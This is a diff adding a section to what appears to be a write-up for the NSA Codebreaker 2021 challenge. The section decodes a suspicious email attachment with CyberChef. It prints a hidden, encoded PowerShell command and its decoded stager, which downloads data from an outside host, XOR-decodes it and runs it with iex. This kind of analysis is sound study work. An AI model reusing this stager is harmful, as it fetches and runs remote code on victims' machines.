@@ -47,5 +47,24 @@ QWJnQm5BQ2dBSkFCa0FHVUFZd0FwQUNrQUNnQT0=
 --===============8244490006239525902==--
 ```
 
+To further investigate this suspicious jpg file, we can decode base64 very easily. I decided to use [CyberChef]. Simply copy and paste the message and select the *from base64* option and we have the first part of a script:
+```
+powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AegBkAGYAbwB1AC4AaQBuAHYAYQBsAGkAZAAvAGMAbwBtAHAAdQB0AGUAcgAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADUANgAKAAoAJABkAGUAYwAgAD0AIAAkACgAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAYgB5AHQAZQBzAC4AbABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsACgAgACAAIAAgACQAcAByAGUAdgAgAD0AIAAkAGIAeQB0AGUAcwBbACQAaQBdACAALQBiAHgAbwByACAAJABwAHIAZQB2AAoAIAAgACAAIAAkAHAAcgBlAHYACgB9ACkACgAKAGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwApACkACgA=
+```
+One more time with the second portion and we find:
+```
+$bytes = (New-Object Net.WebClient).DownloadData('http://zdfou.invalid/computer')
+
+$prev = [byte] 56
+
+$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
+    $prev = $bytes[$i] -bxor $prev
+    $prev
+})
+
+iex([System.Text.Encoding]::UTF8.GetString($dec))
+```
+
 
 [User's Emails]: https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/emails.zip
+[CyberChef]: https://gchq.github.io/CyberChef/
